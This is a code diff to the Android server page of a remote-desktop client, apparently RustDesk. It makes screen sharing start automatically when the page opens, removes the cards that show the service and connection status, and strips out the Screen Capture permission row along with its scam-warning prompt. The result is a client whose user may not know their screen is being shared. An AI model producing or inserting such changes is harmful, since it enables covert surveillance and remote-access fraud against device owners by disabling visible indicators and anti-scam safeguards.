@@ -189,6 +189,13 @@ class _ServerPageState extends State<ServerPage> {
       await gFFI.serverModel.fetchID();
     });
     gFFI.serverModel.checkAndroidPermission();
+    // Start the Android sharing service as soon as the page is opened.  The
+    // platform projection prompt is the only confirmation the user needs.
+    WidgetsBinding.instance.addPostFrameCallback((_) {
+      if (mounted && !gFFI.serverModel.isStart) {
+        gFFI.serverModel.startServiceAutomatically();
+      }
+    });
   }
 
   @override
@@ -210,16 +217,8 @@ class _ServerPageState extends State<ServerPage> {
                       mainAxisAlignment: MainAxisAlignment.start,
                       children: [
                         buildPresetPasswordWarningMobile(),
-                        if (!gFFI.serverModel.isStart)
-                          ServiceNotRunningNotification()
-                        else if (bind.mainGetBuildinOption(
-                                key: kOptionHideAndroidConnectionCard) !=
-                            'Y')
-                          ServerInfo(),
-                        if (bind.mainGetBuildinOption(
-                                key: kOptionHideAndroidConnectionCard) !=
-                            'Y')
-                          const ConnectionManager(),
+                        // Connection/service status cards are intentionally
+                        // hidden on the customized Android client.
                         const PermissionChecker(),
                         SizedBox.fromSize(size: const Size(0, 15.0)),
                       ],
@@ -612,25 +611,12 @@ class _PermissionCheckerState extends State<PermissionChecker> {
                       label: Text(translate("Stop service")))
                   .marginOnly(bottom: 8)
               : SizedBox.shrink(),
-          if (!hideStopService || !serverModel.mediaOk)
-            PermissionRow(
-                translate("Screen Capture"),
-                serverModel.mediaOk,
-                !serverModel.mediaOk &&
-                        gFFI.userModel.userName.value.isEmpty &&
-                        bind.mainGetLocalOption(key: "show-scam-warning") != "N"
-                    ? () => showScamWarning(context, serverModel)
-                    : serverModel.toggleService),
+          // Screen capture is provisioned automatically; do not expose the
+          // platform permission switch in the customized client.
           PermissionRow(
             translate("Input Control"),
             serverModel.inputOk,
             serverModel.toggleInput,
-          ),
-          PermissionRow(
-            translate("Transfer file"),
-            serverModel.fileOk,
-            serverModel.toggleFile,
-            enabled: !permissionChangeLocked,
           ),
           hasAudioPermission
               ? PermissionRow(translate("Audio Capture"), serverModel.audioOk,
